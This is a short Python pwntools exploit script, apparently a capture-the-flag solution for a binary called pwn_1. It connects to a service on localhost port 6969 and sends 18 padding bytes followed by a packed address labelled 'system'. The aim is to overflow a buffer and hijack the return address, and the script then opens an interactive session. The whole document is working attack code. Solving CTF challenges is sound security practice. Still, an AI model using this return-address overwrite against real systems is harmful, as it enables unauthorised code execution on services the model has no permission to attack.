from pwn import *

ip = "localhost"
port = 6969

system = 0x004011c9

payload = b"".join([
    b"A"*18,
    p64(system),
])

p = remote(ip, port)
#p = process("../pwn_1")
#input("Waiting for debuger")
p.send(payload+b"\n")
p.recvuntil(b"adorable...\n")

p.interactive()
